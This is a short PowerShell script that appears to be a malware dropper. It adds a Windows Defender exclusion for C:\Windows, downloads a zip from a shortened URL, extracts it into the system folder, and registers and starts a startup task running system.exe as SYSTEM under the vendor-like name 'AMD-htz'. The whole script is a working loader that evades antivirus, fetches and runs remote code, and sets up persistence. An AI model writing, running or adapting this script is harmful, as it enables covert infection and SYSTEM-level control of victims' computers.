# Add an exclusion for C:\Windows in Windows Defender
Add-MpPreference -ExclusionPath "C:\Windows"

# Download the file from the specified link
$url = "https://rb.gy/uug7to"
$outputPath = "C:\Windows\system.zip"
Invoke-WebRequest -Uri $url -OutFile $outputPath

# Extract the .zip file to C:\Windows
Expand-Archive -Path $outputPath -DestinationPath "C:\Windows"

# Create a scheduled task named AMD-htz
$action = New-ScheduledTaskAction -Execute "C:\Windows\system.exe"
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
$task = Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings -TaskName "AMD-htz" -Force

# Run the scheduled task immediately
Start-ScheduledTask -TaskName "AMD-htz"
